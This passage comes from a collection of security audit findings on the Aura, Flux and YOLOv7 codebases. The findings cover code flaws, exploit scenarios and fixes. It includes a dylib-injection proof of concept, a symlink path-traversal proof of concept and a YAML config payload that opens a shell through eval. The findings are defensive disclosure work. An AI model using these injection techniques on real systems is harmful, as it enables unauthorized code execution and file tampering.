incorrect price. Recommendations Short term, have the code store the used pair_id s in a mapping and validate that a pair_id has not been used when adding a new yang. Long term, review functionalities that perform similar operations and ensure they follow comparable steps.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "11. Invalid price updates still update last_price_update_timestamp ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf", "body": "The Aura contracts rely on price updates from the Pragma oracle to provide necessary price data to the system. Price updates take place periodically based on the update_frequency state variable. In addition, invalid price updates (i.e., price updates that do not meet the minimum requirements for the number of sources aggregated or that are too old) are rejected by the contract. If there is an invalid price update, no state variables are updated and an InvalidPriceUpdate event is emitted instead. However, even if every price update is invalid, the last_price_update_timestamp variable is updated. This could potentially cause delays when computing price updates. // if we receive what we consider a valid price from the oracle, record it in the Shrine, // otherwise emit an event about the update being invalid if is_valid_price_update(response, asset_amt_per_yang) { shrine::read().advance(settings.yang, price * asset_amt_per_yang); } else { InvalidPriceUpdate( settings.yang, price, response.last_updated_timestamp, response.num_sources_aggregated, asset_amt_per_yang ); } idx += 1 ; }; // record and emit the latest prices update timestamp last_price_update_timestamp::write(block_timestamp); PricesUpdated(block_timestamp, get_caller_address()); } Figure 11.1: Part of the update_prices function ( pragma.cairo#L232-L252 ) Exploit Scenario Due to an issue with an o-chain data provider, the Pragma oracle uses a lower number of aggregated sources than the threshold dened by the contract. As a result, every price update is considered invalid, but the last_price_update_timestamp variable is updated regardless. When the o-chain data provider resumes working, update_prices cannot be called for a larger delay than intended, leading to stale prices in the system. Recommendations Short term, modify the code to track the number of invalid price updates that occur when update_prices is called. If this number is equal to the yang count (i.e., no price update was performed), then last_price_update_timestamp should not be updated. Long term, keep track of the necessary preconditions needed for state updates. Have the code validate that state updates take place only if these preconditions are met.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "12. Redistributions can occur even if the Shrine is killed ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf", "body": "The Aura protocol has steps to shut down gracefully. First, the Caretaker::shut function is invoked, which kills the Shrine and withdraws collateral from the Gate contract to the Caretaker contract. The amount of collateral withdrawn is enough to back the total system yin at a 1:1 ratio. During a shutdown, the Caretaker contract will allow trove owners to burn their yin to claim back their collateral. Notably, when the Shrine is killed, its forge and melt functions revert. However, there is nothing stopping a redistribution from occurring when the Shrine is killed as long as the Absorber s yin balance is emptied. Similar to nding 6, if the can_absorb_any variable is false , then shrine.melt will never be called and the call to the absorb function will not revert. If a trove is eligible for absorption, then before the trove owner can call the release function to withdraw their excess collateral, an attacker can front-run them and call absorb , triggering a redistribution. // Only update the absorber and emit the `Purged` event if Absorber has some yin // to melt the trove's debt and receive freed trove assets in return if can_absorb_any { let percentage_freed: Ray = get_percentage_freed( ltv_after_compensation, value_after_compensation, trove_debt, trove_penalty, purge_amt ); // Melt the trove's debt using the absorber's yin directly shrine.melt(absorber.contract_address, trove_id, purge_amt); // Free collateral corresponding to the purged amount let (yangs, absorbed_assets_amts) = free( shrine, trove_id, percentage_freed, absorber.contract_address ); absorber.update(yangs, absorbed_assets_amts); Purged( trove_id, purge_amt, percentage_freed, absorber.contract_address, absorber.contract_address, yangs, absorbed_assets_amts ); } // If it is not a full absorption, perform redistribution. if !is_fully_absorbed { shrine.redistribute(trove_id); // Update yang prices due to an appreciation in ratio of asset to yang from // redistribution oracle::read().update_prices(); } Compensate(caller, yangs, compensations); (yangs, compensations) } Figure 12.1: Part of the absorb function ( purger.cairo#L309-L352 ) Exploit Scenario The Shrine is killed and trove owners pull their yin out of the Absorber contract to reclaim their collateral from the Caretaker . Collateral prices fall and Bobs trove is eligible for absorption. Before Bob can call release to withdraw the excess collateral from a trove, Eve, a malicious user, front-runs him and calls absorb . This forces a redistribution, and as a result, Bob loses his excess collateral permanently. Recommendations Short term, make sure redistributions revert if the Shrine is killed. Long term, improve unit test coverage to uncover edge cases and ensure intended behavior throughout the protocol.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "13. Flash fee is not taken from receiver ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf", "body": "The Flashmint module allows users to mint a percentage of the total yin supply at once as long as they repay the yin at the end of the transaction. In addition, a user must also pay a fee for this ashmint, given by the FLASH_FEE constant. The Flashmint module is intended to be EIP-3156compliant, and as such, it implements the appropriate functions and callbacks. Per EIP-3156, the flash_loan function must receive the ashloaned amount plus the ash fee from the callback; however, shrine.eject is called with only amount as a parameter. Currently, the ash fee is set to 0 so no funds will be lost, but this does break EIP-3156 compliance. shrine.inject(receiver, amount_wad); let initiator: ContractAddress = starknet::get_caller_address(); let borrower_resp: u256 = IFlashBorrowerDispatcher { contract_address: receiver }.on_flash_loan(initiator, token, amount, FLASH_FEE, call_data); assert(borrower_resp == ON_FLASH_MINT_SUCCESS, 'FM: on_flash_loan failed'); // This function in Shrine takes care of balance validation shrine.eject(receiver, amount_wad); Figure 13.1: Part of the flash_mint function ( flashmint.cairo#L98-L109 ) Recommendations Short term, make sure the code includes the FLASH_FEE when calling shrine.eject . Long term, carefully monitor EIPS and ensure that the protocol meets every requirement from the specication. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "1. SetExpiration does not set the expiration for the given key ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf", "body": "The SetExpiration function does not change the expiration for the given key because it does not store the updated item back in the specic cache item (gure 1.1). The SetExpiration function retrieves the corresponding item from the cache and assigns it to the item variable (gure 1.1, line 165). Then it updates the items expiration time by setting its Expiration eld to the current time plus the provided expiration duration (gure 1.1, line 170). Finally, the lock on the cache is released without the prior cache update (gure 1.1, line 171), so any subsequent access to the cache item with the given key will not see the updated expiration set by SetExpiration . 163 164 165 166 167 168 169 170 171 172 } func ( c *cache ) SetExpiration(key string , expiration time.Duration) { c.mu.Lock() item, ok := c.Items[key] if !ok { c.mu.Unlock() return } item.Expiration = time.Now().Add(expiration).UnixNano() c.mu.Unlock() Figure 1.1: The SetExpiration function responsible for setting the expiration for the given key ( source-controller/internal/cache/cache.go#163172 ) Exploit Scenario A developer intentionally places sensitive data with a specic expiration date in the cache. An attacker gains access to condential information because the sensitive data has not expired. This allows the attacker to further compromise the system. Recommendations Short term, explicitly assign the updated item variable back to the c.Items map before releasing the lock (gure 1.2). func (c *cache) SetExpiration(key string , expiration time.Duration) { c.mu.Lock() if item, ok := c.Items[key]; ok { item.Expiration = time.Now().Add(expiration).UnixNano() c.Items[key] = item } c.mu.Unlock() } Figure 1.2: The proposed x that updates the expiration time correctly Long term, extend unit tests in the cache_test.go le to cover the SetExpiration function.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "2. Inappropriate string trimming function ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf", "body": "The handlePayload function fails to remove a specic substring as intended because its implementation uses the strings.TrimLeft function (gure 2.1). The incoming HTTP request URL ( r.RequestURI ) is passed to the strings.TrimLeft function with the apiv1.ReceiverWebhookPath parameter, which is set to /hook (gure 2.1, line 74). The goal is to remove this specic substring from r.RequestURI . However, due to the use of strings.TrimLeft , all occurrences of the specied characters, instead of just the exact substring, are removed from the left side of the string. Consequently, the handling request path is incorrectly logged (gure 2.1, line 76). 71 func (s *ReceiverServer) handlePayload() func (w http.ResponseWriter, r *http.Request) { 72 73 74 return func (w http.ResponseWriter, r *http.Request) { ctx := context.Background() digest := url.PathEscape( strings.TrimLeft (r.RequestURI, apiv1.ReceiverWebhookPath)) // apiv1.ReceiverWebhookPath = /hook 75 76 s.logger.Info(fmt.Sprintf( \"handling request: %s\" , digest)) Figure 2.1: The use of strings.TrimLeft in the handlePayload function ( notification-controller/internal/server/receiver_handlers.go#7177 ) Recommendations Short term, x the handlePayload function to properly remove substrings from the remote URL using strings.TrimPrefix function. Long term, implement unit tests for all string-parsing functions. In the CI/CD pipeline, introduce the golangci-lint tool that uses the Staticcheck tool with the SA1024 check.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Gos default HTTP client uses a shared value that can be modied by other components ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf", "body": "Go's default HTTP client uses a shared http.DefaultClient value that can be modied by other application components, which leads to unexpected behavior. In the case of Flux, the issue arises in the GetLatestVersion and ExistingVersion functions, where the timeout is modied. func GetLatestVersion() ( string , error ) { 91 // GetLatestVersion calls the GitHub API and returns the latest released version 92 93 94 95 96 97 ghURL := \"https://api.github.com/repos/fluxcd/flux2/releases/latest\" c := http.DefaultClient c.Timeout = 15 * time.Second res, err := c.Get(ghURL) Figure 3.1: The GetLatestVersion function that uses http.DefaultClient ( flux2/pkg/manifestgen/install/install.go#9197 ) func ExistingVersion(version string ) ( bool , error ) { 118 // (...) 123 ghURL := fmt.Sprintf( \"https://api.github.com/repos/fluxcd/flux2/releases/tags/%s\" , version) 124 125 c := http.DefaultClient c.Timeout = 15 * time.Second Figure 3.2: The ExistingVersion function that uses http.DefaultClient ( flux2/pkg/manifestgen/install/install.go#118125 ) Exploit Scenario An attacker introduces a malicious library into the Flux codebase that can modify the shared http.DefaultClient value. By manipulating this value, the attacker orchestrates DoS attacks, disrupting the softwares normal operation. Recommendations Short term, avoid using the shared http.DefaultClient value and instead use the go-cleanhttp package to ensure that the HTTP client conguration remains unaected by other parts of the application. Long term, periodically audit other global values that may impact dierent components within Flux. References  hashicorp/go-cleanhttp wrapping functions for accessing \"clean\" Go http.Client values  PoC showing shared global variable used by the default HTTP client", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "4. Unhandled error value ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf", "body": "The eventsCmdRun function in the flux2 repository ignores an error value returned by a call to the getRows function. This can result in incorrect error reporting to the user. 129 rows, err := getRows(ctx, kubeclient, clientListOpts, refListOpts, showNamespace) 130 131 132 133 134 if len (rows) == 0 { if eventArgs.allNamespaces { logger.Failuref( \"No events found.\" ) } else { logger.Failuref( \"No events found in %s namespace.\" , *kubeconfigArgs.Namespace) } 135 136 137 138 } return nil Figure 4.1: Ignored err value ( flux2/cmd/flux/events.go#129-138 ) The getRows function returns a nil value in the rows variable whenever it returns an error, which means the if statements condition on line 130 will be satised. The if statement body will incorrectly report to the user that no events were found, rather than printing the err value. Recommendations Short term, add an err != nil check and modify the eventsCmdRun function to handle error values accordingly (print an error message and then return err ), as shown in the following gure: rows, err := getRows(ctx, kubeclient, clientListOpts, refListOpts, showNamespace) if err != nil { logger.Failuref( \"Error while getting rows: %s\" , err) return err } if len (rows) == 0 { if eventArgs.allNamespaces { logger.Failuref( \"No events found.\" ) } else { logger.Failuref( \"No events found in %s namespace.\" , *kubeconfigArgs.Namespace) } return nil } Figure 4.2: Fixed code snippet Long term, ensure that there are no other places in the Flux codebase where error values are ignored. Adding CodeQL to the project CI/CD with the queries: security-and-quality option will allow the go/useless-assignment-to-local query to catch similar issues.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. Potential implicit memory aliasing in for loops ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf", "body": "Throughout the Flux codebase, loop range values are passed by reference to functions. This reference is unstable and is updated at each iteration of the for loop. Here are two examples: for _, resource := range resources.Items { if err := s.annotate(ctx, &resource ); err != nil { Figure 5.1: Example of memory aliasing in a for loop ( notification-controller/internal/server/receiver_handlers.go#411-412 ) for _, i := range list.Items { if !bucket.GetArtifact().HasRevision(i.Status.ObservedSourceArtifactRevision) { client.ObjectKeyFromObject( &i )}) reqs = append (reqs, reconcile.Request{NamespacedName: Figure 5.2: Example of memory aliasing in a for loop ( source-controller/internal/controller/helmchart_controller.go#1312-1314 ) We did not nd any examples where this results in a security problem. However, it is generally a very unsafe practice; if any of these function calls preserved their input values (e.g., by storing them in structs), the stored value would be changed while the for loop was iterating. A full list of occurrences of this issue can be found in appendix D . Recommendations Short term, replace these references with more permanent ones. Here are two possible ways to do this: for i, v := range l { // option 1: reference the entry in the list // the reference still only lasts as long as the list does foo(&l[i]) // option 2: copy the value before calling the function vClone := v foo(&vClone) } Figure 5.3: Safer ways to pass a reference to a function Long term, implement the gosec tool in the project CI/CD to catch potential issues with Golang. References  Beware of Implicit Memory Aliasing in Go For Loop", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Directories created via os.MkdirAll are not checked for permissions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf", "body": "Flux creates certain directory paths with specic access permissions by using the os.MkdirAll function. This function does not perform any permission checks when a given directory path already exists. This would allow a local attacker to create a directory with broad permissions before Flux could create the directory with narrower permissions, possibly allowing the attacker to later tamper with the les. A full list of occurrences of this issue can be found in appendix D . Exploit Scenario Eve has unprivileged access to a container running a Flux controller. Eve introduces new directories or paths with 0777 permissions before the Flux code does so. Eve then deletes and forges les in that directory to change the result of further code executed by the Flux controller. Recommendations Short term, when using functions such as os.MkdirAll , os.WriteFile , or outil.WriteFile , check all directories in the path and validate their owner and permissions before performing operations on them. This will help avoid situations where sensitive information is written to a preexisting attacker-controlled path. Long term, enumerate les and directories for their expected permissions, and build validation to ensure appropriate permissions are applied before creation and upon use. Ideally, this validation should be centrally dened and used throughout the application as a whole.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Directories and les created with overly lenient permissions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf", "body": "Flux creates various directories and les with overly lenient permissions. This would allow an attacker with unprivileged access to edit, delete, and read les, interfering with Flux controllers operations. if err := os.MkdirAll(abs, 0 o755); err != nil { Figure 7.1: Example of a directory created with overly lenient permissions ( pkg/tar/tar.go#167 ) err = os.WriteFile(path, out, 0 o644) Figure 7.2: Example of a le created with overly lenient permissions ( kustomize-controller/internal/decryptor/decryptor.go#505 ) A full list of occurrences of this issue can be found in appendix D . Recommendations Short term, generally use permissions of 0750 or less for directories and 0600 or less for les. Long term, enumerate les and directories for their expected permissions overall, and build validation to ensure appropriate permissions are applied before creation and upon use. Ideally, this validation should be centrally dened and used throughout the application as a whole.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "8. No restriction on minimum SSH RSA public key bit size ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf", "body": "Flux does not restrict a user from creating a Kubernetes secret for Git authentication using a dangerous SSH RSA public key bit size (gure 8.1). A user can create a conguration with a 16-bit key size (gure 8.2), which is insecure because an attacker can easily brute force the correct private key that matches the public key. var defaultRSAKeyBits = 2048 type RSAKeyBits int // (...) func (b *RSAKeyBits) Set(str string ) error { if strings.TrimSpace(str) == \"\" { *b = RSAKeyBits(defaultRSAKeyBits) return nil } bits, err := strconv.Atoi(str) if err != nil { return err } if bits == 0 || bits% 8 != 0 { return fmt.Errorf( \"RSA key bit size must be a multiples of 8\" ) } *b = RSAKeyBits(bits) return nil } Figure 8.1: The Set function responsible for the --ssh-rsa-bits parameter validation ( flux2/internal/flags/rsa_key_bits.go#2547 ) $ flux create secret git podinfo-auth \\ --url=ssh://git@github.com/stefanprodan/podinfo \\ --export --ssh-rsa-bits 16 --ssh-key-algorithm=rsa --- apiVersion: v1 kind: Secret metadata: name: podinfo-auth namespace: flux-system stringData: identity: | -----BEGIN PRIVATE KEY----- MDoCAQAwDQYJKoZIhvcNAQEBBQAEJjAkAgEAAgMAsDkCAwEAAQICMZECAgDlAgIA xQICAJUCAgCRAgFd -----END PRIVATE KEY----- identity.pub: | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAAwCwOQ == Figure 8.2: The flux command to create a Kubernetes secret for Git authentication using a 16-bit RSA public key Recommendations Short term, implement a strict minimum requirement of 1024 bits for the SSH RSA public key size. This will ensure that users cannot create Kubernetes secrets with dangerously small key sizes, such as the 16-bit example shown in gure 8.2. By enforcing a larger key size, the system's security will signicantly improve because it will be much more resistant to brute-force attacks. Long term, periodically review other Flux arguments to ensure they do not allow insecure congurations.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "9. Flux macOS release binary susceptible to .dylib injection ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf", "body": "The Flux macOS release binary does not have Hardened Runtime restrictions enabled (gure 9.1), making the binary vulnerable to a .dylib le injection attack. A .dylib injection attack allows an attacker to inject a custom dynamic library (.dylib) into a process, potentially leading to, for example, unauthorized access to sensitive information. $ brew install fluxcd/tap/flux $ codesign -dvvv ` which flux ` /usr/local/bin/flux: code object is not signed at all Figure 9.1: Installing the ocial release of Flux by Homebrew and using the codesign tool to check whether the binary has the kSecCodeSignatureEnforcement ag enabled $ cat inj.c #include <stdio.h> // The constructor attribute causes the function to be called automatically before before main() is called __attribute__((constructor)) static void customConstructor(int argc, const char **argv) { printf(\"Successfully injected dylib\\n\"); } # Exporting the DYLD_INSERT_LIBRARIES environment variable to inject dynamic libraries into other running processes $ export DYLD_INSERT_LIBRARIES=`pwd`/inj.dylib $ flux Successfully injected dylib Command line utility for assembling Kubernetes CD pipelines the GitOps way. (...) Figure 9.2: The proof of concept showing that the custom .dylib le can be successfully injected into the flux process Exploit Scenario An attacker gains access to a target users machine and crafts a malicious .dylib to steal passwords from the standard Flux input. Then the attacker sets the DYLD_INSERT_LIBRARIES environment variable in the .zshrc le to the path of the crafted .dylib. The user executes the flux bootstrap github command with the --token-auth parameter and provides a GitHub personal access token through standard input. As a result, the hijacked access token is sent to the attacker. Recommendations Short term, sign the release macOS Flux binaries and verify that the code signature ags include the kSecCodeSignatureEnforcement ag to ensure the Hardened Runtime protects the binary. The code signature ags are displayed in the CodeDirectory line when running the codesign command (gure 9.3):   A 0x0 ag indicates that the binary has a standard code signature without additional features. A 0x10000 ag ( kSecCodeSignatureEnforcement ) indicates that the application has implemented runtime hardening policies. $ codesign -dvvv ` which kubectl ` Executable =/Applications/Docker.app/Contents/Resources/bin/kubectl Identifier =kubectl Format =Mach-O thin (x86_64) CodeDirectory v = 20500 size = 431283 flags =0x10000(runtime) hashes = 13472 +2 location =embedded Figure 9.3: An example that uses the codesign tool to show a hardened kubectl binary Long term, implement automatic checks in the project CI/CD pipeline to ensure the release binary has Hardened Runtime restrictions enabled. References   DYLIB Injection in Golang apps on Apple silicon chips A Deep Dive into Penetration Testing of macOS Applications (Part 2)", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "10. Path traversal in SecureJoin implementation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf", "body": "The SecureJoinVFS function in pkg/git/gogit/fs is meant to join two paths, root and unsafePath , with the condition that the returned path must be scoped within root . However, it is possible for an attacker to cause the function to return a path outside the root directory by crafting a symlink in the root directory. This compromises the methods on the OS struct in the pkg/git/gogit/fs library. Here is a portion of the code for SecureJoinVFS : 99 100 101 // Absolute symlinks reset any work we've already done. if filepath.IsAbs(dest) { if !fi.IsDir() && strings.HasPrefix(dest, root+ string (filepath.Separator)) { 102 103 104 105 } return filepath.Clean(dest), nil } path.Reset() Figure 10.1: Code snippet from SecureJoinVFS ( pkg/git/gogit/fs/join.go#L99-L105 ) The if statements on lines 100 and 101 check that dest (the destination of a symlink) is an absolute path that has root/ as a prex. In this case, dest is returned. However, it is possible for dest to both begin with root/ and not be a child of root . For instance, /tmp/rootDir/../a.txt begins with /tmp/rootDir/ but is not a descendent of /tmp/rootDir/ (it resolves to /tmp/a.txt ). Here is a proof of concept showing how an attacker could write to a le outside the root directory: $ # STATE OF THE FILESYSTEM BEFORE MAIN.GO IS RUN; NOTE THE SYMLINK IN ROOTDIR $ pwd /tmp/poc $ ls -l rootDir total lrwxr-xr-x 1 sam wheel 42 Aug 2 17:25 file.txt -> /tmp/poc/rootDir/../unrelatedDir/pwned.txt $ ls -l unrelatedDir total 0 $ # MAIN.GO SHOULD LEAVE EVERYTHING OUTSIDE OF ROOTDIR UNTOUCHED, SINCE IT USES THE SECURE FILE SYSTEM $ cat main.go package main import ( \"fmt\" \"github.com/fluxcd/pkg/git/gogit/fs\" \"os\" ) func main() { // Secure file system rooted in rootDir my_os := fs.New( \"/tmp/poc/rootDir\" ) // Open file.txt and write hello to it; shouldnt affect anything outside of rootDir f, err := my_os.OpenFile( \"file.txt\" , os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600 ) if err != nil { fmt.Println(err) return } _, err = f.Write([] byte ( \"hello\\n\" )) if err != nil { fmt.Println(err) return } err = f.Close() if err != nil { fmt.Println(err) return } // To indicate that we havent hit any errors fmt.Println( \"success\" ) } $ go run main.go success $ ls -l rootDir total 0 lrwxr-xr-x 1 sam wheel 42 Aug 2 17:25 file.txt -> /tmp/poc/rootDir/../unrelatedDir/pwned.txt $ ls -l unrelatedDir total -rw------- 1 sam wheel 6 Aug 2 17:27 pwned.txt $ cat unrelatedDir/pwned.txt hello $ # A file in unrelatedDir got written to because of the malicious symlink Figure 10.2: Proof of concept to demonstrate breaking out of SecureJoin root directory This issue will be high severity when the pkg/git/gogit/fs library is considered on its own because its main security guarantee is that it should not be possible to read or write outside the root directory. However, due to the time-boxed nature of this audit, we did not determine whether there is a way to exploit this vulnerability to aect Flux as a whole. Recommendations Short term, remove the return statement in gure 10.1, line 102; the loop should continue even when a symlink with an absolute path is hit, and the return statement at the end of the function (line 114) is not susceptible to this vulnerability. Long term, expand unit tests to catch similar issues. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "1. Multiple uses of subprocess.check_output with shell=True could allow command injection ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf", "body": "Various parts of the codebase rely on various shell commands to obtain relevant information for the user. For instance, as shown in gure 1.1, the git_describe function uses subprocess.check_output to run a git command. Functions such as subprocess.check_output are permissive functions that allow arbitrary commands to be run; as a result, it is important that these functions are used carefully to prevent command injection attacks, where an attacker crafts malicious input that results in subprocess.check_output running a malicious command. def git_describe(path=Path(__file__).parent): # path must be a directory # return human-readable git description, i.e. v5.0-5-g3e25f1e 54 55 https://git-scm.com/docs/git-describe 56 57 58 stderr=subprocess.STDOUT).decode()[:-1] 59 60 return '' except subprocess.CalledProcessError as e: # not a git repository s = f'git -C {path} describe --tags --long --always' try: return subprocess.check_output(s, shell=True, Figure 1.1: Snippet of git_describe in utils/torch_utils.py def check_git_status(): # Recommend 'git pull' if code is out of date print(colorstr('github: '), end='') try: 72 73 74 75 76 77 78 79 cmd = 'git fetch && git config --get remote.origin.url' 80 81 url = subprocess.check_output(cmd, shell=True).decode().strip().rstrip('.git') # github repo url 82 assert Path('.git').exists(), 'skipping check (not a git repository)' assert not isdocker(), 'skipping check (Docker image)' assert check_online(), 'skipping check (offline)' branch = subprocess.check_output('git rev-parse --abbrev-ref HEAD', n = int(subprocess.check_output(f'git rev-list {branch}..origin/master # checked out # commits behind s = f\" WARNING: code is out of date by {n} commit{'s' * (n > f\"Use 'git pull' to update or 'git clone {url}' to download if n > 0: shell=True).decode().strip() 83 --count', shell=True)) 84 85 1)}. \" \\ 86 latest.\" 87 88 89 90 91 print(e) else: s = f'up to date with {url} ' print(emojis(s)) # emoji-safe except Exception as e: Figure 1.2: Snippet of check_git_status in utils/general.py It is recommended that functions like subprocess.check_output and subprocess.run are called with the input command parameterized in an array (rather than as a single string) and with shell=False (the default). The reason for this is that when shell=False, these subprocess functions will execute only if each element in the parameterized input array does not contain whitespace. This will prevent any sort of command injection attack, even when the attack can control some of the values in the parameterized input. However, as shown in gures 1.1 and 1.2, multiple locations in the YOLOv7 codebase call subprocess.check_output with a single string for the command and shell=True. Here are all the instances of subprocess.check_output being called with shell=True:  utils/general.py lines 81, 82, 83, and 114  utils/google_utils.py lines 15 and 31  utils/torch_utils.py line 58 Exploit Scenario An attacker crafts a malicious command that they would like to inject into an instance of subprocess.check_output. This attacker forces their target victim to use a directory path or a git branch that contains this malicious command as a substring, which allows them to inject a command into subprocess.check_output in either gure 1.1 or gure 1.2. Recommendations Short term, call subprocess.check_output with shell=False in all instances. Also, use a parameterized input array rather than constructing a single string for the command being called. Long term, review all instances of subprocess, eval, os.system, and any other permissive functions to ensure they are being used safely. In addition, consider replacing these instances with safer internal Python API calls. For instance, consider using GitPython rather than using subprocess.check_output to obtain git information.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Models are stored and loaded as pickle les throughout the YOLO codebase ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf", "body": "Throughout the YOLOv7 codebase, models are serialized and loaded using functions such as torch.load and torch.save, which rely on pickle les. Pickle les have become prevalent in the machine learning space for serializing models because their exibility makes it possible to serialize several kinds of models without much eort. However, pickle les are known to be insecure, as they allow the execution of arbitrary code. If any of these pickle les are obtained from an untrusted source, an attacker could inject malicious code into the pickle le, which would run on the victim's machine. Figure 1.1 shows one of several locations that rely on torch.load to load models. This instance is particularly risky because the model can potentially be downloaded from an external source using the attempt_download function. If an attacker is able to compromise the site that hosts these models, they would obtain a vector for remote code execution. def create(name, pretrained, channels, classes, autoshape): \"\"\"Creates a specified model Arguments: name (str): name of model, i.e. 'yolov7' pretrained (bool): load pretrained weights into the model channels (int): number of input channels classes (int): number of model classes Returns: pytorch model \"\"\" try: cfg = list((Path(__file__).parent / 'cfg').rglob(f'{name}.yaml'))[0] # model.yaml path model = Model(cfg, channels, classes) if pretrained: fname = f'{name}.pt' # checkpoint filename attempt_download(fname) # download if not found locally ckpt = torch.load(fname, map_location=torch.device('cpu')) # load Figure 2.1: snippet of create in hubconf.py We consider this issue to have high diculty because, in order to exploit it, an attacker must be able to serve a malicious pickle le to a target victim. It is possible that if an attacker is able to serve these malicious les, then they likely have the ability to perform other attacks directly, although this may not always be possible. Moreover, malicious pickle les are much more dicult to detect without proper inspection, as it is possible for these les to execute malicious code and still correctly load the model les. Exploit Scenario An attacker serves a malicious pickle le that exltrates all of the victims credentials and sends them to a server controlled by the attacker. The attacker carefully crafts the pickle le so that after the credentials have been exltrated, the YOLO model still loads correctly, and the victim does not detect anything malicious. Recommendations Short term, when loading PyTorch models, use the weights_only unpickler and load_state_dict(); consider using ckling to detect possible malicious pickle les before loading them. Long term, use a safer serialization format, such as safetensors or ONNX, which allows for the serialization of complex models without allowing for the execution of arbitrary code. References  Never a dill moment: Exploiting machine learning pickle les", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "3. Parsing of YAML cong le can lead to arbitrary code execution ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf", "body": "When initiating a Model class in train.py, it can take a YAML as a conguration le for the backbone of a model architecture. The conguration le is parsed by the parse_model function in models/yolo.py. The function uses an eval function on lines in the conguration le, as shown in gure 3.1. 742 743 744 745 746 layers, save, c2 = [], [], ch[-1] for i, (f, n, m, args) in enumerate(d['backbone'] + d['head']): m = eval(m) if isinstance(m, str) else m for j, a in enumerate(args): try: Figure 3.1: Snippet of parse_model in models/yolo.py The eval function allows execution of arbitrary expressions from a string. Without proper validation of inputs, an attacker could inject malicious code to execute on a victims machine. In model.py, the function checks only if the current instance is a string and inputs it to eval without any proper validation. Exploit Scenario An adversary replaces a list of numbers with a list of a single, malicious string in the backbone section of the conguration le while keeping the rest of the conguration le the same, as shown in gure 3.2. 13 14 15 16 17 backbone: [[-1, 1, Conv, [\"__import__('os').system('/bin/sh')\"]], [-1, 1, Conv, [64, 3, 2]], [-1, 1, Bottleneck, [64]], [-1, 1, Bottleneck, [64]], Figure 3.2: Snippet of a malicious conguration YAML le When given this conguration le, the parse_model function evaluates the string as code and executes it. In this example, os.system was used to open a shell. When the user trains their data in train.py, they load this YAML le using the cfg ag in the command line. Unset python3 train.py --workers 8 --device 0 --batch-size 32 --data data/coco.yaml --img 640 640 --cfg cfg/baseline/yolov7-malicious.yaml --weights '' --name yolov7 --hyp data/hyp.scratch.p5.yaml Recommendations Short term, remove the usage of eval entirely and instead either construct the objects explicitly or use a modeling library such as Pydantic. Long term, review all instances of subprocess, eval, os.system, and any other permissive functions to ensure they are being used safely. In addition, consider replacing these instances with safer internal Python API calls, such as those described in the short term recommendation.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "4. Untrusted pre-trained models can lead to arbitrary code execution ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf", "body": "The same vulnerability mentioned in nding TOB-YOLO-3 can be exploited using a pretrained model. In train.py, the user is allowed to provide a conguration YAML le as architecture backbone or a *.pt le as a pretrained model. 88 model = Model(opt.cfg or ckpt['model'].yaml, ch=3, nc=nc, \\ anchors=hyp.get('anchors')).to(device) Figure 4.1: Creating a model class using the pretrained file The pretrained model can have an attribute called yaml, which is similar to the YAML used for the model architecture except that it is a Python dictionary. Since the parsing is the same, the vulnerability is still present, and the eval function can be exploited by crafting a malicious pretrained le. Exploit Scenario The attacker writes their own Model class with an attribute called yaml that is a dictionary with the same properties as a YAML le used as a conguration le. The victim user creates an instance of that class and stores it in a dictionary with the string 'model' as a key and the object as its value. The victim user then saves the dictionary as a *.pt le using PyTorch, which creates a malicious pretrained le. The victim user then loads the pretrained le in the command line using the weights ag. Unset python3 train.py --workers 8 --device 0 --batch-size 32 